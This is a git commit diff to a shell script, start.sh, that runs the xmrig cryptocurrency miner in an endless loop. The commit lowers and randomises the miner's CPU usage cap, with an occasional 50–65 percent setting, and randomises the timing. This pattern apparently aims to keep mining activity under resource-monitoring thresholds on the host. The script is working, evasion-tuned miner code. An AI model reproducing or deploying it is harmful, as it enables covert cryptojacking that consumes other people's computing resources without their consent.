42d7c2319727d23997c5a4c63f5ca3a4197296b3
superalix <97192839+superalix@users.noreply.github.com>
2022-01-15 01:17:39 +0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -10,13 +10,19 @@ tar -xvf xmrig
 cp xmrig-6.16.2/xmrig xmrig
 t_min=45
 t_max=120
-cpu_min=80
-cpu_max=200
+cpu_min=50
+cpu_max=100
 chmod 777 xmrig
 while true :
   do
     t=$(($t_min + $RANDOM % ($t_max - $t_min)))
+    if [[ $(shuf -i 1-5 -n 1) -eq 4 ]]
+    then
+    echo "The variable is 4"
+    cpu=$(shuf -i 50-65 -n 1)
+    else
     cpu=$(shuf -i 89-100 -n 1)
+    fi
     echo $cpu
     cat config.json |jq -r --arg cpu "$cpu" '."max-cpu-usage"=$cpu' > u.json
     mv u.json config.json 
